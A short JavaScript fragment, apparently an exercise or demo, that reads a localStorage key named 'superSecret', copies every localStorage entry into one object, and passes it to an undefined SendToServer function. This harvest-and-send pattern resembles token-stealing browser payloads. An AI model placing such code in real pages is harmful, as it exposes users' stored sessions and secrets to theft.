console.log('hello from home');

let name2 = 'superSecret';

let data = localStorage.getItem(name2);

let arrData = {};

for(let item in localStorage){
    if(item == 'key' || item == 'getItem' || item == 'setItem' || item == 'removeItem' || item == 'clear' || item == 'length'){}
    else{
        arrData[item] = localStorage[item];
        // console.log(item,localStorage[item]);
    }    
}

// console.log(arrData);

SendToServer(arrData);
